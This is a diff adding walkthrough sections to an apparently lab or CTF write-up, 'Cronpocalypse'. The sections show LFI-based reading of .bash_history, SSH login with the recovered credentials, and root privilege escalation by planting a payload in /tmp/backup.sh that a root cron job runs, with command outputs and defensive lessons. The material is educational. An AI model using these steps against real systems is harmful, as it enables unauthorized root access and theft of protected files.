@@ -758,6 +758,370 @@ Sensitive credentials should never appear in:
 
 ---
 
+# Cronpocalypse — Part 2: Cron Job Privilege Escalation
+
+## Overview
+
+After gaining SSH access as the `ctf` user and retrieving the user flag, the next phase involved identifying a privilege escalation vector through cron jobs.
+
+The target system exposed:
+
+- `crond` running as root
+- a root cron job
+- execution of a script from `/tmp`
+- insecure trust of a world-writable directory
+
+This resulted in full root compromise.
+
+---
+
+# Step 1 — Enumerate SUID Binaries
+
+Check for SUID-enabled binaries:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Output:
+
+```text
+/usr/bin/crontab
+/usr/bin/sudo
+```
+
+Notably:
+
+- No SUID `find`
+- No SUID shell binaries
+- Presence of `crontab`
+- Presence of active cron daemon
+
+---
+
+# Step 2 — Identify Running Processes
+
+Monitor active processes:
+
+```bash
+watch -n 1 ps aux
+```
+
+Observed processes:
+
+```text
+PID   USER     TIME  COMMAND
+1     root     0:00  python3 /opt/webapp/app.py
+8     root     0:00  sshd: /usr/sbin/sshd -D
+11    root     0:00  crond -b -L /var/log/cron.log
+23    ctf      0:00  -sh
+177   ctf      0:00  ps aux
+```
+
+Important discovery:
+
+```text
+crond -b -L /var/log/cron.log
+```
+
+This confirmed:
+
+- cron daemon active
+- root scheduled tasks likely present
+
+---
+
+# Step 3 — Enumerate Root Cron Jobs
+
+Check root crontab:
+
+```bash
+cat /etc/crontabs/root
+```
+
+Output:
+
+```text
+* * * * * /bin/sh /opt/root_cron.sh
+```
+
+This means:
+
+- root executes `/opt/root_cron.sh`
+- execution occurs every minute
+
+---
+
+# Step 4 — Inspect the Root Cron Script
+
+Read the script contents:
+
+```bash
+cat /opt/root_cron.sh
+```
+
+Output:
+
+```bash
+#!/bin/sh
+/bin/sh /tmp/backup.sh
+```
+
+Critical finding:
+
+```text
+/tmp/backup.sh
+```
+
+The root cron job executes a script from `/tmp`.
+
+---
+
+# Why This Is Vulnerable
+
+`/tmp` is normally world-writable:
+
+```bash
+ls -ld /tmp
+```
+
+Typical permissions:
+
+```text
+drwxrwxrwt
+```
+
+Meaning:
+
+- any user can create files
+- root trusts attacker-controlled content
+- arbitrary command execution becomes possible
+
+This is a classic insecure cron configuration vulnerability.
+
+---
+
+# Step 5 — Create Malicious Script
+
+Create the payload:
+
+```bash
+echo "cp /root/flag-root.txt /tmp/flag-root.txt && chmod 777 /tmp/flag-root.txt" > /tmp/backup.sh
+```
+
+Make it executable:
+
+```bash
+chmod +x /tmp/backup.sh
+```
+
+---
+
+# Step 6 — Wait for Cron Execution
+
+The cron job runs every minute:
+
+```text
+* * * * *
+```
+
+Wait approximately 60 seconds.
+
+Root automatically executes:
+
+```bash
+/bin/sh /tmp/backup.sh
+```
+
+---
+
+# Step 7 — Retrieve Root Flag
+
+Read the copied flag:
+
+```bash
+cat /tmp/flag-root.txt
+```
+
+Example:
+
+```text
+flag{root_compromise_success}
+```
+
+---
+
+# Full Exploit Chain
+
+## Initial Access
+
+```bash
+curl "http://TARGET/read?file=/home/ctf/.bash_history"
+```
+
+↓
+
+Recovered credentials
+
+↓
+
+```bash
+ssh ctf@TARGET
+```
+
+---
+
+## Enumeration
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+↓
+
+```bash
+cat /etc/crontabs/root
+```
+
+↓
+
+```bash
+cat /opt/root_cron.sh
+```
+
+---
+
+## Privilege Escalation
+
+```bash
+echo "cp /root/flag-root.txt /tmp/flag-root.txt && chmod 777 /tmp/flag-root.txt" > /tmp/backup.sh
+```
+
+↓
+
+Root executes attacker-controlled script
+
+↓
+
+Root flag obtained
+
+---
+
+# Security Issues Identified
+
+## 1. Local File Inclusion (LFI)
+
+Allowed arbitrary file reads:
+
+- `/etc/passwd`
+- `.bash_history`
+
+---
+
+## 2. Credential Exposure
+
+Sensitive credentials stored in:
+
+```text
+.bash_history
+```
+
+---
+
+## 3. Insecure Cron Job Design
+
+Root cron trusted a script in:
+
+```text
+/tmp
+```
+
+This violates secure execution principles.
+
+---
+
+## 4. World-Writable Directory Abuse
+
+Using `/tmp` for privileged execution enables:
+
+- privilege escalation
+- arbitrary code execution
+- persistence mechanisms
+
+---
+
+# Defensive Recommendations
+
+## Never Execute Scripts from `/tmp`
+
+Bad:
+
+```bash
+/bin/sh /tmp/script.sh
+```
+
+Good:
+
+```bash
+/bin/sh /opt/scripts/script.sh
+```
+
+With strict permissions:
+
+```bash
+chmod 700 script.sh
+chown root:root script.sh
+```
+
+---
+
+## Restrict Writable Locations
+
+Avoid executing privileged code from:
+
+- `/tmp`
+- `/dev/shm`
+- user-controlled paths
+
+---
+
+## Audit Cron Jobs
+
+Review:
+
+```bash
+/etc/crontab
+/etc/cron.*
+/var/spool/cron/
+```
+
+Ensure:
+
+- scripts are root-owned
+- scripts are not writable
+- paths are absolute
+- no user-controlled content exists
+
+---
+
+# Key Lessons
+
+This lab demonstrates a complete Linux attack chain:
+
+1. Web application vulnerability
+2. Credential harvesting
+3. SSH access
+4. Cron misconfiguration
+5. Root privilege escalation
+
+The most critical flaw was:
+
+```text
+Root executing a script from a world-writable directory
+```
+
+This single design mistake allowed full system compromise.
+
 ## Least Privilege
 
 Misconfigured:
@@ -799,3 +1163,321 @@ Cronpocalypse demonstrates how small Linux misconfigurations can chain together 
 Understanding these attack paths is essential for both offensive security testing and defensive hardening.
 
 ---
+
+## Part 3
+# Cronpocalypse — Root Cron Exploitation (Corrected Walkthrough)
+
+## Discovering the Root Cron Job
+
+After enumerating cron tasks, the root crontab revealed:
+
+```bash
+cat /etc/crontabs/root
+```
+
+Output:
+
+```text
+* * * * * /bin/sh /opt/root_cron.sh
+```
+
+This indicated that root executed `/opt/root_cron.sh` every minute.
+
+---
+
+# Attempting Direct Modification
+
+The first attempt was to append commands directly into the root-owned cron script:
+
+```bash
+echo "cp /root/flag-root.txt /tmp/flag-root.txt && chmod 777 /tmp/flag-root.txt" >> /opt/root_cron.sh
+```
+
+Result:
+
+```text
+/bin/sh: can't create /opt/root_cron.sh: Permission denied
+```
+
+This confirmed:
+
+- the file was root-owned
+- the `ctf` user lacked write permissions
+- direct modification was not possible
+
+---
+
+# Inspecting the Cron Script
+
+Reading the script contents:
+
+```bash
+cat /opt/root_cron.sh
+```
+
+Output:
+
+```bash
+#!/bin/sh
+/bin/sh /tmp/backup.sh
+```
+
+Critical observation:
+
+```text
+/tmp/backup.sh
+```
+
+The root cron job executed a script from `/tmp`.
+
+---
+
+# Why This Is Dangerous
+
+The `/tmp` directory is world-writable by design.
+
+Typical permissions:
+
+```text
+drwxrwxrwt
+```
+
+This means:
+
+- any user can create files
+- root trusted attacker-controlled content
+- arbitrary command execution became possible
+
+This is a classic cron privilege escalation vulnerability.
+
+---
+
+# Creating the Malicious Script
+
+A malicious payload was written into `/tmp/backup.sh`:
+
+```bash
+echo "cp /root/flag-root.txt /tmp/flag-root.txt && chmod 777 /tmp/flag-root.txt" > /tmp/backup.sh
+```
+
+Attempting to set executable permissions:
+
+```bash
+chmod +x /tmp/backup.sh
+```
+
+Result:
+
+```text
+chmod: /tmp/backup.sh: Operation not permitted
+```
+
+Attempting sudo:
+
+```bash
+sudo chmod +x /tmp/backup.sh
+```
+
+Output:
+
+```text
+ctf is not in the sudoers file.
+This incident has been reported to the administrator.
+```
+
+Despite the permission issue, the cron job still executed the script because it was explicitly invoked with:
+
+```bash
+/bin/sh /tmp/backup.sh
+```
+
+Meaning:
+
+- executable permissions were unnecessary
+- the shell directly interpreted the file contents
+
+---
+
+# Retrieving the Root Flag
+
+After waiting for the cron job to execute, the `/tmp` directory contained:
+
+```bash
+ls
+```
+
+Output:
+
+```text
+backup.sh
+backup.tar.gz
+cron.lAccPh
+flag-root.txt
+```
+
+Reading the flag:
+
+```bash
+cat /tmp/flag-root.txt
+```
+
+Output:
+
+```text
+c6322974-f9e1-41e6-ef27-e407e30a6dcf
+```
+
+Root compromise was successful.
+
+---
+
+# Why the Exploit Worked Without `chmod +x`
+
+The cron task used:
+
+```bash
+/bin/sh /tmp/backup.sh
+```
+
+This is different from executing:
+
+```bash
+/tmp/backup.sh
+```
+
+Because the script was passed directly into the shell interpreter, executable permissions were not required.
+
+Equivalent behavior:
+
+```bash
+sh script.sh
+```
+
+The shell reads and executes the file contents directly.
+
+---
+
+# Exploit Chain Summary
+
+## 1. Enumerate Cron
+
+```bash
+cat /etc/crontabs/root
+```
+
+↓
+
+Discovered:
+
+```text
+* * * * * /bin/sh /opt/root_cron.sh
+```
+
+---
+
+## 2. Inspect Root Script
+
+```bash
+cat /opt/root_cron.sh
+```
+
+↓
+
+Discovered:
+
+```bash
+/bin/sh /tmp/backup.sh
+```
+
+---
+
+## 3. Create Malicious Payload
+
+```bash
+echo "cp /root/flag-root.txt /tmp/flag-root.txt && chmod 777 /tmp/flag-root.txt" > /tmp/backup.sh
+```
+
+---
+
+## 4. Wait for Cron Execution
+
+Root automatically executed:
+
+```bash
+/bin/sh /tmp/backup.sh
+```
+
+---
+
+## 5. Retrieve Root Flag
+
+```bash
+cat /tmp/flag-root.txt
+```
+
+---
+
+# Security Lessons
+
+## Never Execute Scripts from `/tmp`
+
+Dangerous:
+
+```bash
+/bin/sh /tmp/script.sh
+```
+
+Safe alternative:
+
+```bash
+/bin/sh /opt/scripts/script.sh
+```
+
+with:
+
+```bash
+chmod 700 script.sh
+chown root:root script.sh
+```
+
+---
+
+## Avoid Trusting World-Writable Directories
+
+Directories such as:
+
+- `/tmp`
+- `/dev/shm`
+- user home directories
+
+must never be trusted for privileged execution.
+
+---
+
+## Principle of Least Privilege
+
+Root cron jobs should:
+
+- execute only trusted files
+- use absolute paths
+- avoid writable locations
+- validate ownership and permissions
+
+---
+
+# Key Takeaway
+
+The core vulnerability was:
+
+```text
+Root executed attacker-controlled code from /tmp
+```
+
+This single design flaw allowed full root compromise without requiring:
+
+- sudo access
+- SUID abuse
+- kernel exploits
+- password cracking
+```
+
